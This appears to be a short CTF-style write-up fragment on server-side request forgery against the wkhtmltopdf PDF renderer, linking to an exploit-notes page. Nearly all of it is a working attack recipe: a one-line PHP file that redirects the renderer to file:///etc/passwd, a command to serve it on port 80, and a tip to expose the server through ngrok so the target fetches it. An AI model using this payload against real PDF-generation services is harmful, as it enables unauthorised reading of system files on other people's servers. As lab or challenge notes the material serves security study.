[wkhtmltopdf-ssrf](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/)


* index.php content

  ```
  <?php header("location:file:///etc/passwd");?>
  ```

* start php server
 
  ```
  php -S 0.0.0.0:80
  ```
* User ngrok to connect the dots

![image](https://github.com/reneanto/write-ups/assets/44943249/d0f0aa26-17c2-4cd6-870a-ce86214f41e3)
